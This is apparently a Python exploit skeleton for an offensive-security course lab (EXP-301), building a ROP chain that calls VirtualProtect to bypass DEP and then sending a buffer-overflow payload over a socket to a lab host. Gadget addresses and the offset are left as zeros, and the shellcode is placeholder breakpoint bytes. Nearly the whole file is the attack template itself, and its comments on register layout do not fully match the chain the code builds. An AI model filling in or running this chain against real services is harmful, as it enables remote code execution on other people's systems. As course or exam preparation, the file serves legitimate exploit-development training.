#!/usr/bin/env python3
"""EXP-301 DEP/ASLR bypass skeleton — ROP to VirtualProtect/VirtualAlloc.

Chain recipe (mona: !mona rop -m <module> -cpb '<badchars>'):
  VirtualProtect(lpAddress=shellcode addr, dwSize=0x1000,
                 flNewProtect=PAGE_EXECUTE_READWRITE 0x40, lpflOldProtect=writable)
Then jmp to shellcode.

Use `python3 exp301.py rop mona_rop.txt` to pre-fill gadget addresses,
then assemble the API-specific chain below.
"""
import socket, struct

# ---------- CONFIG ----------
HOST, PORT = "10.10.10.5", 7000
OFFSET = 0
BADCHARS = {0x00}
# -----------------------------

def p32(v): return struct.pack('<I', v)

# --- gadgets (fill from mona rop output) ---
G = {
    'pop_eax':  0x0, 'pop_ebx': 0x0, 'pop_ecx': 0x0, 'pop_edx': 0x0,
    'pop_esi':  0x0, 'pop_edi': 0x0, 'pop_ebp': 0x0,
    'pushad':   0x0,   # <- often the easy way: set regs then pushad
    'jmp_esp':  0x0,
    'vp_iat':   0x0,   # <- ptr to VirtualProtect IAT entry
    'writable': 0x0,   # <- any writable addr for lpflOldProtect
}

def rop_virtualprotect(shellcode_addr):
    """Register layout for pushad-style VirtualProtect call:
       ebp=jmp esp trampoline, esi=VP addr, edi/ebx=ROP NOPs,
       eax=0x40, ecx=writable, edx=0x1000, esp=shellcode."""
    c  = p32(G['pop_eax']) + p32(0x40)             # flNewProtect
    c += p32(G['pop_ecx']) + p32(G['writable'])    # lpflOldProtect
    c += p32(G['pop_edx']) + p32(0x1000)           # dwSize
    c += p32(G['pop_esi']) + p32(G['vp_iat'])      # VirtualProtect
    c += p32(G['pop_edi']) + p32(G['jmp_esp'])     # return-to-esp after VP
    c += p32(G['pop_ebp']) + p32(shellcode_addr)   # (arrange per pushad layout)
    c += p32(G['pop_ebx']) + p32(0x0)              # filler
    c += p32(G['pushad'])
    return c

buf  = b"A" * OFFSET
buf += rop_virtualprotect(0x0)      # <- compute stack addr at runtime
buf += b"\x90" * 16
buf += b"\xcc" * 512

s = socket.socket()
s.connect((HOST, PORT))
s.sendall(buf)
print(f"[+] sent {len(buf)} bytes")
s.close()
